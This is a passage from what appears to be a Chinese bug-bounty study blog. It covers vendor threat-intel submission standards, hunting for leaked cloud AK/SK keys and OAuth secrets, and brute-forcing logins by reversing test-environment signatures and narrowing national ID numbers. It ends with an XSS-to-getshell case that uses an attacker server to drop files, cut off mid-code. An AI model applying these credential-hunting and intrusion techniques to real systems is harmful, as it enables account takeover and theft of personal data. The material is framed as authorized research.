+<h2 id="5-2-SRC-对情报的处理方式"><a href="#5-2-SRC-对情报的处理方式" class="headerlink" title="5.2 SRC 对情报的处理方式"></a>5.2 SRC 对情报的处理方式</h2><p>值得注意的是各个 SRC 对威胁情报的处理流程不同。有些大型公司往往配置自己的情报处理团队（如情报部门）或交给对应业务的安全团队（如风控部门），各 SRC 审核往往只针对业务方和情报部门的反馈根据影响范围定级，不直接参与情报审核。所以情报类漏洞的处理流程和时间与常规漏洞提交相比<strong>往往会长数倍</strong>。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：为什么会长数倍？因为常规漏洞——安全团队自己就能复现和定级。但威胁情报——安全团队需要找业务方确认”这是不是真的有影响”，而业务方可能不熟悉安全流程，可能不积极，可能看了觉得”这不是问题”。所以情报提交的审批链更长、沟通成本更高。但如果最终确认，如订单泄漏类往往轻易达到高危严重级别——因为业务影响是直接的、巨大的。</p>
+</blockquote>
+<h2 id="5-3-不同厂商看重什么？"><a href="#5-3-不同厂商看重什么？" class="headerlink" title="5.3 不同厂商看重什么？"></a>5.3 不同厂商看重什么？</h2><p>情报和漏洞相同，根据厂商业务不同的侧重点，也会受到不同程度的重视：</p>
+<ul>
+<li>某些依赖电商营收的业务方，往往对<strong>订单泄漏</strong>问题极为重视，内部也存在专业的风控情报团队第一时间收集、处理外部威胁情报。因为订单数据直接影响用户隐私和平台信任。</li>
+<li>某些厂商作为”游戏”&#x2F;IM 大厂，对<strong>游戏侧外挂、账号、私服、装备</strong>等威胁情报往往更为重视（也较多发生）。因为外挂和私服直接影响游戏营收。</li>
+</ul>
+<p><strong>提交情报之前先思考：这个情报对这家公司的核心业务影响有多大？</strong> 这个判断决定了情报的定级和处理优先级。</p>
+<h2 id="5-4-某厂商情报收取标准示例"><a href="#5-4-某厂商情报收取标准示例" class="headerlink" title="5.4 某厂商情报收取标准示例"></a>5.4 某厂商情报收取标准示例</h2><table>
+<thead>
+<tr>
+<th>风险场景</th>
+<th>常见行为</th>
+<th>要求（必须项）</th>
+<th>无效报告定义&#x2F;不收取的范围</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>电商活动作弊</strong></td>
+<td>营销活动中抢购秒杀作弊<br>会员活动无限刷会员权益<br>直播间绕过规则获取福利红包</td>
+<td>1、涉及工具类的提供可执行的软件工具样本文件或下载地址，并附上工具使用方法；<br>2、涉及教程类的提供详细的作弊教程并附上测试验证过程（包含测试账号）；<br>3、涉及漏洞类的提供漏洞详情及复现并附上复现过程（包含复现账号）；</td>
+<td>1、上报已发现或失效的情报无效；<br>2、工具类：由 Auto.js、E4A、hamibot、按键精灵等框架开发的完全模拟用户点击操作的脚本工具不予收录；</td>
+</tr>
+<tr>
+<td><strong>电商虚假交易</strong></td>
+<td>批量刷商品销量、刷达人口碑分、刷商家体验分、刷订单评价<br>刷直播间点赞、互动、网购、支付等以获取实时流量<br>为达到洗钱、销赃目的进行的不实交易行为</td>
+<td>1、涉及到众包任务的提供任务时间、对象（商品&#x2F;直播间&#x2F;商家&#x2F;达人）、详细步骤、佣金、详细要求等；<br>2、涉及到刷单&#x2F;刷分&#x2F;刷评&#x2F;刷赞等任务群，提供对应任务发布群、任务详情；<br>3、涉及到刷单&#x2F;刷赞等服务平台的提供对应网站地址链接、服务选项及价格、服务收费账号、网站公司主体等；<br>4、涉及洗钱销赃的提供对应洗钱销赃的渠道、洗钱&#x2F;销赃方法、涉及的商家等；</td>
+<td>1、上报已发现或失效的情报无效；<br>2、仅提供外部存在刷单&#x2F;刷分&#x2F;刷评服务，上报可能刷量、引流的QQ群号、刷量站点或黑产群发的广告信息，未提供证据的情报无效（必须包含可查验的刷手真实订单、刷手账号、详细行为手法）；<br>3、上报单个或少量用户的非业务规则问题导致的刷量行为无效；</td>
+</tr>
+<tr>
+<td><strong>电商恶意行为</strong></td>
+<td>利用平台规则批量进行恶意索赔，或传播相关教程<br>有组织地对商家商品进行恶意投诉、恶意评价<br>有组织地在电商直播间进行恶意引流、恶意举报、恶意评论等行为</td>
+<td>1、涉及到教程的提供对应的教程详情，包含利用点、利用方式、实际受损账号信息；<br>2、涉及到众包任务的提供任务时间、对象（商品&#x2F;直播间&#x2F;商家&#x2F;达人）、详细步骤、佣金、详细要求等；</td>
+<td>1、上报已发现或失效的情报无效；<br>2、仅上报可能存在恶意行为的QQ群号、论坛或引流广告信息，未提供证据的情报（必须包含明确被索赔或举报的商家或达人、商品、举报人账号、详细行为手法）无效；</td>
+</tr>
+<tr>
+<td><strong>敏感信息泄露</strong></td>
+<td>对批量订单信息（包含收件人手机号、地址等）导出泄露<br>对电商直播间或作者相关的匿名信息进行提取泄露<br>商家&#x2F;达人&#x2F;用户相关的账号信息（账号密码、收款银行卡、绑定身份证等）获取泄露</td>
+<td>1、涉及泄露的数据样本的提供至少20条以上，需要包含可追溯的身份字段（比如UID、抖音号、订单号、手机号、身份证号等）；如果捕获到数据售卖线索，需要提供卖家联系方式、完整聊天记录和收款方式，单个电子面单截图线索无效；<br>2、涉及接口或软件工具的提供对应数据泄露接口及利用方式，或工具实际使用成功的过程。</td>
+<td>1、上报已发现或失效的情报无效；<br>2、非字节侧或字节直接对接的第三方平台泄露，暂不收录（例如运营商拦截）；<br>3、单个电子面单截图反馈的数据泄露线索无效；若为后台截图，未提供准确截图时间的线索无效；</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>推理深挖</strong>：这个表格的重要性不在于具体内容，而在于它展示了<strong>厂商如何评估情报价值</strong>：必须有证据、必须可复现、必须是新的、必须有具体影响——不是”我发现有人在搞这个”就能算情报的。看这个表格你能反推出厂商的风控痛点在哪里：活动作弊（营销成本）、虚假交易（平台信誉）、恶意行为（商家生态）、信息泄露（合规底线）。</p>
+</blockquote>
+<h2 id="5-5-情报要素——3W1H-辅助"><a href="#5-5-情报要素——3W1H-辅助" class="headerlink" title="5.5 情报要素——3W1H + 辅助"></a>5.5 情报要素——3W1H + 辅助</h2><p><strong>重点关注——核心线索（3W1H）</strong>：</p>
+<table>
+<thead>
+<tr>
+<th align="center">Who（谁）</th>
+<th align="center">Where（在什么点）</th>
+<th align="center">How（利用什么方法）</th>
+<th align="center">What（做什么事）</th>
+</tr>
+</thead>
+</table>
+<p><strong>辅助线索</strong>：</p>
+<table>
+<thead>
+<tr>
+<th align="center">When（什么时间）</th>
+<th align="center">Why（什么原因）</th>
+<th align="center">How Much（产生多大危害）</th>
+</tr>
+</thead>
+</table>
+<p>多条线索的任意组合均可产生对应的情报。提供更多线索信息对于情报的价值越大。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这个框架说明了一个道理——情报不是”我发现了 X”，而是”我发现了谁（Who）在什么地方（Where）用什么方法（How）做了什么（What），造成了多大影响（How Much）”——缺少任何一个维度，情报的完整性就下降。</p>
+</blockquote>
+<h2 id="5-6-怎么挖掘威胁情报？"><a href="#5-6-怎么挖掘威胁情报？" class="headerlink" title="5.6 怎么挖掘威胁情报？"></a>5.6 怎么挖掘威胁情报？</h2><p>咸鱼、拼多多、京东等这些”情报产生地”，一些黑灰产群聊、TG 上。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：为什么是这些地方？因为这些平台是黑灰产交易和讨论的聚集地。闲鱼上有卖刷量服务的，TG 群里有数据买卖的，拼多多和京东上有刷单任务发布的——<strong>黑产在哪里活跃，情报就在哪里产生</strong>。关键在于你要能区分”普通用户在卖二手”和”黑产在卖刷量服务”。</p>
+</blockquote>
+<h2 id="5-7-提交格式示例"><a href="#5-7-提交格式示例" class="headerlink" title="5.7 提交格式示例"></a>5.7 提交格式示例</h2><p><strong>情报</strong>：某某 App 活动可以刷取无限抢题</p>
+<ol>
+<li>介绍活动表明不可以存在的现象。</li>
+<li>写出获取情报的地方：URL + 截图。</li>
+<li>买下软件，然后提交软件。（完成前三步至少有一个中危了）</li>
+<li>获取商家的联系方式，获得更多的信息。</li>
+</ol>
+<blockquote>
+<p><strong>推理深挖</strong>：第三步为什么要买软件？因为你需要<strong>向厂商证明这个工具确实可行</strong>——一个可运行的样本比截图更有说服力。而且买软件这个行为本身也提供了更多线索（卖家信息、支付方式、价格等），有助于厂商溯源和打击。</p>
+</blockquote>
+<h2 id="5-8-隐私合规"><a href="#5-8-隐私合规" class="headerlink" title="5.8 隐私合规"></a>5.8 隐私合规</h2><p>另一个知识点是隐私合规。这部分与传统漏洞挖掘不同——隐私合规关注的是应用是否在未经用户同意的情况下收集、使用、传输个人信息。这是合规层面的问题，但在国内 SRC 中逐渐受到重视。</p>
+<hr>
+<h1 id="六、相关标准与平台索引"><a href="#六、相关标准与平台索引" class="headerlink" title="六、相关标准与平台索引"></a>六、相关标准与平台索引</h1><h2 id="6-1-阿里巴巴集团"><a href="#6-1-阿里巴巴集团" class="headerlink" title="6.1 阿里巴巴集团"></a>6.1 阿里巴巴集团</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://security.alibaba.com/announcement/announcement?id=80">阿里巴巴集团威胁情报定级标准 V2.0（ASRC-2016-15）</a></li>
+<li><a target="_blank" rel="noopener" href="https://security.alibaba.com/announcement/announcement?id=151">ASRC 漏洞定级与奖励标准（核心漏洞分级依据）</a></li>
+<li><a target="_blank" rel="noopener" href="https://security.alibaba.com/announcement/announcement?id=213">阿里云业务漏洞标准 v1.0（云产品漏洞分级细则）</a></li>
+<li><a target="_blank" rel="noopener" href="https://security.alibaba.com/announcement/announcement?id=187">ASRC 漏洞提交规范（报告格式要求）</a></li>
+<li><a target="_blank" rel="noopener" href="https://security.alibaba.com/announcement/announcement?id=218">ASRC 使用指南（含情报&#x2F;漏洞提交流程）</a></li>
+<li><a target="_blank" rel="noopener" href="https://security.alibaba.com/announcement/announcement?id=182">ASRC 官方规则说明（含受理范围与排除项）</a></li>
+</ul>
+<h2 id="6-2-国家-行业核心标准"><a href="#6-2-国家-行业核心标准" class="headerlink" title="6.2 国家&#x2F;行业核心标准"></a>6.2 国家&#x2F;行业核心标准</h2><h3 id="漏洞管理与分级类"><a href="#漏洞管理与分级类" class="headerlink" title="漏洞管理与分级类"></a>漏洞管理与分级类</h3><ol>
+<li>GB&#x2F;T 30276-2020 信息安全技术 网络安全漏洞管理规范</li>
+<li>GB&#x2F;T 30279-2020 信息安全技术 网络安全漏洞分类分级指南</li>
+<li>GB&#x2F;T 28458-2012 信息安全技术 安全漏洞标识与描述规范</li>
+<li>网络产品安全漏洞管理规定（工信部&#x2F;网信办&#x2F;公安部 2021）</li>
+</ol>
+<h3 id="等级保护与安全管理类"><a href="#等级保护与安全管理类" class="headerlink" title="等级保护与安全管理类"></a>等级保护与安全管理类</h3><ol start="5">
+<li>GB&#x2F;T 22239-2019 信息安全技术 网络安全等级保护基本要求</li>
+<li>GB&#x2F;T 25058-2019 信息安全技术 网络安全等级保护实施指南</li>
+<li>GB&#x2F;T 20985.1-2017 信息安全技术 信息安全事件管理 第1部分：事件分类分级指南</li>
+<li>网络安全等级保护 2.0 — <a target="_blank" rel="noopener" href="https://www.cac.gov.cn/2019-12/16/c_1578253770367738.htm">https://www.cac.gov.cn/2019-12/16/c_1578253770367738.htm</a></li>
+<li>信息安全漏洞管理规范（GB&#x2F;T 30275）— <a target="_blank" rel="noopener" href="https://openstd.samr.gov.cn/bzgk/std/newGbInfo?hcno=080D6FBF8C0862F9035B6A6D7C3F8A0B">https://openstd.samr.gov.cn/bzgk/std/newGbInfo?hcno=080D6FBF8C0862F9035B6A6D7C3F8A0B</a></li>
+</ol>
+<h2 id="6-3-国际通用标准与权威平台"><a href="#6-3-国际通用标准与权威平台" class="headerlink" title="6.3 国际通用标准与权威平台"></a>6.3 国际通用标准与权威平台</h2><ol>
+<li>CVE（Common Vulnerabilities and Exposures）官方数据库 — <a target="_blank" rel="noopener" href="https://cve.mitre.org/">https://cve.mitre.org/</a></li>
+<li>NVD（National Vulnerability Database）美国国家漏洞数据库 — <a target="_blank" rel="noopener" href="https://nvd.nist.gov/">https://nvd.nist.gov/</a></li>
+<li>CVSS（Common Vulnerability Scoring System）官方标准 — <a target="_blank" rel="noopener" href="https://www.first.org/cvss/">https://www.first.org/cvss/</a></li>
+<li>ISO&#x2F;IEC 29147:2018 漏洞披露国际标准 — <a target="_blank" rel="noopener" href="https://www.iso.org/obp/ui/#!iso:std:72311:en">https://www.iso.org/obp/ui/#!iso:std:72311:en</a></li>
+<li>CISA 已知被利用漏洞目录（KEV） — <a target="_blank" rel="noopener" href="https://www.cisa.gov/known-exploited-vulnerabilities">https://www.cisa.gov/known-exploited-vulnerabilities</a></li>
+</ol>
+<h2 id="6-4-国内权威漏洞共享平台"><a href="#6-4-国内权威漏洞共享平台" class="headerlink" title="6.4 国内权威漏洞共享平台"></a>6.4 国内权威漏洞共享平台</h2><ol>
+<li>CNVD（国家信息安全漏洞共享平台） — <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></li>
+<li>CNNVD（国家信息安全漏洞库） — <a target="_blank" rel="noopener" href="http://www.cnnvd.org.cn/">http://www.cnnvd.org.cn/</a></li>
+<li>国家网络安全漏洞共享平台（工信部） — <a target="_blank" rel="noopener" href="https://www.cert.org.cn/">https://www.cert.org.cn/</a></li>
+</ol>
+<h2 id="6-5-主流厂商安全标准与响应中心"><a href="#6-5-主流厂商安全标准与响应中心" class="headerlink" title="6.5 主流厂商安全标准与响应中心"></a>6.5 主流厂商安全标准与响应中心</h2><h3 id="国际厂商"><a href="#国际厂商" class="headerlink" title="国际厂商"></a>国际厂商</h3><ol>
+<li>Microsoft 安全响应中心（MSRC）漏洞标准 — <a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability">https://msrc.microsoft.com/update-guide/vulnerability</a></li>
+<li>Google 安全漏洞奖励计划（VRP）标准 — <a target="_blank" rel="noopener" href="https://bughunter.withgoogle.com/about">https://bughunter.withgoogle.com/about</a></li>
+<li>Apple 安全漏洞披露指南 — <a target="_blank" rel="noopener" href="https://support.apple.com/zh-cn/HT201127">https://support.apple.com/zh-cn/HT201127</a></li>
+</ol>
+<h3 id="国内厂商"><a href="#国内厂商" class="headerlink" title="国内厂商"></a>国内厂商</h3><ol>
+<li>腾讯安全应急响应中心（TSRC）漏洞定级标准 — <a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/whitehat/rule">https://security.tencent.com/index.php/whitehat/rule</a></li>
+<li>百度安全应急响应中心（BSRC）漏洞奖励标准 — <a target="_blank" rel="noopener" href="https://bsrc.baidu.com/vulnerability">https://bsrc.baidu.com/vulnerability</a></li>
+<li>华为安全漏洞奖励计划（HVRP）标准 — <a target="_blank" rel="noopener" href="https://www.huawei.com/cn/psirt">https://www.huawei.com/cn/psirt</a></li>
+</ol>
+<h2 id="6-6-专项安全标准与实践指南"><a href="#6-6-专项安全标准与实践指南" class="headerlink" title="6.6 专项安全标准与实践指南"></a>6.6 专项安全标准与实践指南</h2><ol>
+<li>全国网络安全标准化技术委员会（TC260）实践指南 — <a target="_blank" rel="noopener" href="https://www.tc260.org.cn/standards/practice_guide.html">https://www.tc260.org.cn/standards/practice_guide.html</a></li>
+<li>数据安全法配套标准：GB&#x2F;T 35273-2020 个人信息安全规范</li>
+<li>工业控制系统安全标准：GB&#x2F;T 30976.1-2014 工业控制系统信息安全</li>
+</ol>
+<hr>
+<h1 id="七、API-安全与云安全"><a href="#七、API-安全与云安全" class="headerlink" title="七、API 安全与云安全"></a>七、API 安全与云安全</h1><h2 id="7-1-OAuth-2-0"><a href="#7-1-OAuth-2-0" class="headerlink" title="7.1 OAuth 2.0"></a>7.1 OAuth 2.0</h2><p>OAuth 2.0 的知识查看自己的 blog 笔记。</p>
+<p><strong>三个重要的要素</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>要素</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>apikey</code></td>
+<td>API 的标识号——告诉服务端”是哪个应用在调用”</td>
+</tr>
+<tr>
+<td><code>appsecret</code></td>
+<td>API 的密钥——证明”这个应用确实是他声称的那个应用”</td>
+</tr>
+<tr>
+<td><code>redirecturl</code></td>
+<td>回调地址——OAuth 认证完成后，用户被重定向到哪里</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>推理深挖</strong>：为什么 redirecturl 是关键要素？因为如果回调地址可以被篡改，攻击者就能劫持 OAuth 流程——让授权码（code）发到自己的服务器，然后用这个 code 换取 access_token，完成账号接管。这是 OAuth 最常见的安全问题之一。</p>
+</blockquote>
+<p>对应开发平台的使用手册即可对 API 进行调用。</p>
+<p>对一个客户端进行反编译之后，如果可以获取到一些调用 OAuth 认证的参数，就可以去查看对应厂商的 API 文档进行进一步的利用。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：为什么反编译能拿到这些参数？因为客户端（APP）调用第三方 API 时，需要把 <code>apikey</code>、<code>appsecret</code> 等凭证硬编码或配置在客户端里——反编译就能提取这些凭证。</p>
+</blockquote>
+<h2 id="7-2-云安全入门——AK-SK-泄露"><a href="#7-2-云安全入门——AK-SK-泄露" class="headerlink" title="7.2 云安全入门——AK&#x2F;SK 泄露"></a>7.2 云安全入门——AK&#x2F;SK 泄露</h2><h3 id="7-2-1-泄露途径"><a href="#7-2-1-泄露途径" class="headerlink" title="7.2.1 泄露途径"></a>7.2.1 泄露途径</h3><ul>
+<li><strong>JS 代码泄露 AK&#x2F;SK、secret</strong>（JS 代码泄露是非常常见的）。为什么 JS 代码容易泄露 AK&#x2F;SK？因为前端代码需要直接调用云服务（如上传文件到 OSS），而调用云服务需要 AK&#x2F;SK——开发为了方便，把 AK&#x2F;SK 写在了前端代码里，而这对于任何能访问网站的人都是可见的。</li>
+<li><strong>GitHub 仓库泄露 AK&#x2F;SK</strong>——在 GitHub 中搜索关键字，然后下载所有文件，然后使用 VSCode 全局搜索，看看能不能找到泄露。那关键字是什么呢？可以去查所调用厂商的文档，就可以知道关键词（腾讯云 <code>AKID</code>…）。这里的关键技巧是：<strong>每个云厂商的 AK 都有固定的前缀格式</strong>，比如腾讯云的 <code>AKID</code> 开头、阿里云的 <code>LTAI</code> 开头——用这些特征前缀去 GitHub 搜索，命中率远高于搜索 “access_key” 这种通用关键词。</li>
+<li>APP 反编译</li>
+<li>小程序反编译</li>
+<li>返回包中回显 AK&#x2F;SK——这属于严重的安全事故，意味着服务端把不应该返回的凭证返回给了前端。</li>
+<li>其余配置文件中</li>
+</ul>
+<h3 id="7-2-2-案例：企业微信-Secret-泄露"><a href="#7-2-2-案例：企业微信-Secret-泄露" class="headerlink" title="7.2.2 案例：企业微信 Secret 泄露"></a>7.2.2 案例：企业微信 Secret 泄露</h3><p>JS 文件和前端源码泄露——我们通过访问获取到一个企业微信登录的站点：<code>https://open.work.weixin.qq.com/wwopen/sso/...</code></p>
+<p>获取这个页面后，我们可以查看页面源代码，寻找 <code>secret</code>，但是可以发现找不到。这说明当前的代码中可能已经移除了敏感信息——但历史上可能存在过。</p>
+<p>借助网站 <code>https://web.archive.org</code>，然后去找到这个 2021 年 10 月中旬到 11 月的数据，看看有没有 <code>secret</code>。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：为什么用 Wayback Machine？因为<strong>网页会迭代更新，但互联网档案馆保存了历史快照</strong>——开发可能在某个版本中写了 secret，后来被发现后删除了，但历史快照中依然存在。时间线攻击：当前版本找不到 → 历史版本可能存在 → 互联网档案馆提供时间旅行能力。</p>
+</blockquote>
+<p>得到 <code>secret</code> 之后，就去查看企业微信的文档，通过企业微信 <code>corpid</code>（企业 ID）、泄露的 <code>corpsecret</code>（应用凭证）调用 <code>gettoken</code> 接口。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这里的关键是——拿到凭证只是第一步，<strong>知道怎么用这个凭证才是完整的利用链</strong>——而这需要查阅厂商的 API 文档。凭证本身没有危害，凭证 + API 调用能力才有危害。</p>
+</blockquote>
+<h3 id="7-2-3-session-key-的泄露"><a href="#7-2-3-session-key-的泄露" class="headerlink" title="7.2.3 session_key 的泄露"></a>7.2.3 session_key 的泄露</h3><p>（待补充）</p>
+<hr>
+<h1 id="八、暴力破解"><a href="#八、暴力破解" class="headerlink" title="八、暴力破解"></a>八、暴力破解</h1><h2 id="8-1-找测试环境"><a href="#8-1-找测试环境" class="headerlink" title="8.1 找测试环境"></a>8.1 找测试环境</h2><p>对于一个金融领域的后台管理登录页面，我们可以在此时的域名基础上去寻找是否存在遗留下来的<strong>测试环境</strong>。比如是 <code>A.com</code>，看看有没有 <code>Atest.com</code>。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：为什么测试环境是突破口？因为测试环境的防护往往远低于生产环境。测试环境可能没有 WAF、没有 rate limit、没有复杂的前端签名——因为这些都是为了对抗线上攻击的，测试环境不需要。而且测试环境的代码可能是旧版本，存在已知漏洞但未修复。</p>
+</blockquote>
+<p>如果在主站进行爆破的话，大概率存在 <code>signature</code>——主站的签名是后端给你生成的。这意味着每次请求都需要有效的签名，而签名算法你不知道，所以无法构造有效请求进行爆破。</p>
+<p>而<strong>测试环境的签名在前端</strong>。为什么测试环境的签名会放在前端？因为测试环境为了方便，可能直接在 JS 中实现了签名逻辑，而不是通过后端接口生成。这样前端 JS 中就会暴露签名算法——你知道了算法，就能自己构造签名，然后爆破。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这背后是一个普遍规律：<strong>生产环境和测试环境的安全策略存在不对称</strong>。主站的严密防护在测试环境可能完全不存在——这就是攻击者的机会窗口。</p>
+</blockquote>
+<h2 id="8-2-用户名枚举"><a href="#8-2-用户名枚举" class="headerlink" title="8.2 用户名枚举"></a>8.2 用户名枚举</h2><p>现有登录界面 <code>username</code>、<code>password</code>。如果随便输入一个用户名，发现会返回提示”不存在该用户名”，这时候的第一步就是加载字典，把有效用户名弄出来。如果就只想爆破用户名为 admin 或 administrator 的密码，在实际的 SRC 中会很碰壁的。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：为什么用户名枚举是爆破的第一步？因为直接爆破用户名+密码的组合空间太大了（N 个用户 × M 个密码）。但如果先确定哪些用户名是存在的，爆破范围就从 N×M 缩小到了 n×M（n &lt;&lt; N）。这是一种<strong>分而治之</strong>的策略——先解决”谁存在”，再解决”密码是什么”。</p>
+<p>如果系统在用户名不存在和密码错误时返回不同的提示信息，就说明存在用户名枚举——这是登录功能最常见的低级信息泄露之一。</p>
+</blockquote>
+<h3 id="8-2-1-案例一：金融后台系统的签名逆向-工号爆破"><a href="#8-2-1-案例一：金融后台系统的签名逆向-工号爆破" class="headerlink" title="8.2.1 案例一：金融后台系统的签名逆向 + 工号爆破"></a>8.2.1 案例一：金融后台系统的签名逆向 + 工号爆破</h3><p>一些测试系统的前端会有 debug 签名。首先要了解这里的”签名”是指什么？在你这个网站登录页爆破的场景里，「debug 签名」不是安卓那个调试证书，而是你在调试网站登录接口时，破解&#x2F;绕过了接口的「请求签名校验」，拿到了能让服务器正常响应的合法请求格式（比如请求包中的 signature 的值就是这个 Debug 签名）。</p>
+<p>寻找这个 Debug 签名的过程实际上就是 F12 打法——JS 接口算法查找等等。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：实际上最重要的是找到签名的算法，然后逆向写出 Python 的 exp 爆破出用户名+密码对应的 signature，然后用户名+密码+signature 再去进行登录爆破。</p>
+</blockquote>
+<p>这个场景下，如果我们可以爆破出一个用户名和密码，但是登录测试环境失败，提示需要到正式的后台系统登录，然后我就转到正式的后台登录也是失败了（可能是这个账号已经被排除了）。然后难道就结束了吗？</p>
+<p>补充一下，这是一个有关金融的行业的后台系统。我去银行，其工作人员是有工号的并且理应是有规律的。比如 2025 年入职的，<code>2025383119</code>，其中 2025 是年份，383 可能是部门编号，119 可能是员工编号。最后也是通过密码字典成功爆破登录。</p>
+<p>然后就可以去测绘找其他一样的后台系统（实现通杀），扩大攻击面。</p>
+<blockquote>
+<p><strong>逻辑链总结</strong>：找到测试环境 → F12 逆向签名算法 → Python 计算签名 → 爆破用户名+密码 → 登录成功 → 测绘同类系统 → 通杀。</p>
+<p>这个场景最难的两个点：<strong>一是签名算法的查找与逆向；二是正式系统的用户名的获取</strong>。</p>
+</blockquote>
+<h3 id="8-2-2-案例二：一站式服务大厅——身份证爆破"><a href="#8-2-2-案例二：一站式服务大厅——身份证爆破" class="headerlink" title="8.2.2 案例二：一站式服务大厅——身份证爆破"></a>8.2.2 案例二：一站式服务大厅——身份证爆破</h3><p>目标是进入一站式服务大厅。</p>
+<p>首先我们的思路是寻找那些弱口令系统（默认密码是身份证 6 位等等），如果是没有 WAF 的爆破次数限制应该是比较好办的。一些 edu 的 SRC 挖掘，用户名（学号、工号等等）可以通过学校的各种公告、Google 的搜索以及魔法可以收集到一些有用的用户名。</p>
+<p>实际上，在真实的 SRC 挖掘中，可能出现完整的学号工号信息应该很少了，就算有（比如一些奖学金的公示），也会在规定的时间内下架或者是进行了模糊。</p>
+<p>这里给出一个场景是默认密码是身份证后六位，而我们通过上面的信息收集方式得到了某个职工的出生日期，或是职工是哪里人等等信息。又给出这个场景——身份证号显示前 6 位和最后一位，出生日期全部显示，同时标注性别，那么此处得到身份证前 14 位和最后一位校验位。有了 15 位就差 3 位数字，三位数字也有 1000 种可能，实际上还是有继续缩小范围的方法的（阅读身份证规则）。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：参考 GB 11643-1999 公民身份号码文件，身份证号码的结构是：</p>
+<ul>
+<li>前 6 位：地址码（已知）</li>
+<li>第 7-14 位：出生日期（已知）</li>
+<li>第 15-17 位：顺序码（其中第 17 位奇数为男偶数为女，已知性别就能排除一半）</li>
+<li>第 18 位：校验码（可通过前 17 位计算）</li>
+</ul>
+<p>查看规则之后就可以用 Python 脚本将 1000 种可能缩减到 50 种。像这种一站式登录，一般都有 WAF，所以越少爆破越好。这属于很老的技巧了。</p>
+</blockquote>
+<hr>
+<h1 id="九、技能特训——实战案例深度拆解"><a href="#九、技能特训——实战案例深度拆解" class="headerlink" title="九、技能特训——实战案例深度拆解"></a>九、技能特训——实战案例深度拆解</h1><h2 id="9-1-案例一：游戏中心客服——从-XSS-到-Getshell"><a href="#9-1-案例一：游戏中心客服——从-XSS-到-Getshell" class="headerlink" title="9.1 案例一：游戏中心客服——从 XSS 到 Getshell"></a>9.1 案例一：游戏中心客服——从 XSS 到 Getshell</h2><p>一个集成游戏的中心，各种厂商都在上面，类似 Steam 这种。我们启动游戏之后，发现一个功能点——点击前往客服反馈。</p>
+<p><strong>第一层思考</strong>：客服反馈能挖出什么样的漏洞？XSS？CSRF（无交互和有交互）？有没有上传点？</p>
+<p>当我们发一个 baidu 的链接给客服，虽然客服表示不理解，但是弹出了 baidu 的窗口。这个弹窗的窗口含有这个游戏中心的图标，实际上就表明它是用自己内置的浏览器访问了 baidu。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这个场景与无交互的 CSRF 有点像，可以思考。内置浏览器打开了外部链接 → 说明出网 → 说明可能没有 URL 白名单限制。</p>
+</blockquote>
+<p><strong>第二层思考</strong>：可以在自己的攻击服务器上编辑一个 HTML 页面（含一些 JS 代码），然后丢这个攻击端点链接给客服。为什么要这么做？我们的目的是观察它是否会加载 JS → 资源加载。</p>
+<p>那我们编写一个弹框，随后发现弹框了，同时也可以说明这个服务器没有设置访问白名单。</p>
+<p><strong>第三层思考</strong>：那怎么利用？要达到什么效果？既然机器出网，能加载 JS 代码，尝试下载文件，发现仍有权限下载文件。那么可以本地新建一个 <code>evil.txt</code> 文件压缩为 zip 上传到攻击服务器，丢给客服通过攻击服务器的攻击端点，然后攻击端点则创建文件上传 form 表单，创建 a 标签自动访问攻击服务器的下载端点，从而将文件下载到云服务器。</p>
+<blockquote>
+<p><strong>逻辑链</strong>：内置浏览器出网 → 无白名单 → 可加载外部 JS → 构造自动下载页面 → 文件落地到服务器。</p>
+</blockquote>
+<p><strong>过程中的问题</strong>：</p>
+<ol>
+<li>我怎么知道到底服务器到底有没有下载？<br>→ 可以通过查看攻击服务器的日志查看文件端点是否被访问过。</li>
+<li>我怎么知道我这个文件被下载到哪里？<br>→ 通过浏览器打开 form.html 可以查看到具体的文件信息（文件路径）。</li>
+<li>这个文件被下载之后到底有没有被杀软杀掉？<br>→ 取决于目标环境，需要后续验证。</li>
+<li>怎么让服务器运行木马呢？<br>→ 可以将其加入定时任务中，但问题的关键是——木马存在吗？木马在哪里？</li>
+</ol>
+<p><strong>关键突破</strong>：怎么通过其浏览器打开文件管理器？</p>
+<p>这也是攻击思路中为什么要构造 form 表单：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/upload&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span 